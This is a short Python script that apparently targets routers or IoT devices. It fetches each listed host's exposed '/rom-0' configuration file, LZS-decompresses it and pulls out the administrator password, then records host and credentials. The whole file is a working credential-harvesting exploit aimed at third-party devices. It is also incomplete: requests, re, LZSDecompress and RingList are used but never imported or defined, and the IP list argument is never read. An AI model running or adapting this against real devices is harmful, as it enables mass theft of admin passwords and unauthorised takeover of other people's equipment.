#!/usr/bin/env python3

import argparse

description = "."
parser = argparse.ArgumentParser(description=description)
parser.add_argument('--list', dest='list', help='IP addresses list.')
args = parser.parse_args()

iots = list()

def exploit(host, thread):
    try:
        response = requests.get(f"http://{host}/rom-0", verify=False, timeout=1)
    except Exception:
        return # connection rejected

    if response.status_code != 200:
        return # not vulnerable

    data = response.content[8568:]
    result, window = LZSDecompress(data, RingList(2048))

    password = re.findall("([\040-\176]{5,})", result)

    if password[0]:
        iots.append(f"{host} - admin:{password}")
